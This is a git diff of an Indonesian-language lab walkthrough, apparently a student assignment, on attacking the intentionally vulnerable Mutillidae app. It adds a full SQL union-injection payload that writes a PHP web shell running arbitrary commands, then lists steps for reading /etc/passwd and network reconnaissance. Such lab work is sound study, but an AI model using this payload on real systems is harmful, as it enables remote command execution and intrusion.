@@ -16,15 +16,23 @@
     
   ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/inspect%20elemet%20100.PNG "INSPECT ELEMEN dan UBAH SIZE")
   
-   7. Melakukan Backdoor Union SQL Union Injection. Dengan perintah " ' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/html/mutillidae/execute_command.php' --  "
+   7. Melakukan Backdoor Union SQL Union Injection. Bertujuan untuk membuat file axecute_command.php. Dengan perintah " ' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/html/mutillidae/execute_command.php' --  "
    
-  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/hasil%20run%20perl%20script.PNG "HASIL SQL INJECTION DENGAN PERL")
+  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/hasil%20execue%20command.PNG "Membuat file execute_command.php")
   
-   12. Jalankan script perl dengan perintah ./lesson7.pl
+   8. Membuka execute_command.php
    
-  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/hasil%20run%20perl%20script.PNG "HASIL SQL INJECTION DENGAN PERL")
+  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/section10_1.PNG "Membuka execute_command.php")
   
-   12. Jalankan script perl dengan perintah ./lesson7.pl
+   9. Mengetahui siapa yang log in
    
-  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/hasil%20run%20perl%20script.PNG "HASIL SQL INJECTION DENGAN PERL")
+  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/section10_2.PNG "Mengetahui siapa yang log in")
+
+  10. Exploring /etc/passwd
+   
+  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/section10_3.PNG "Exploring /etc/passwd")
+  
+  11. Network Reconnaissance
+   
+  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/section10_4.PNG "Network Reconnaissance")
   
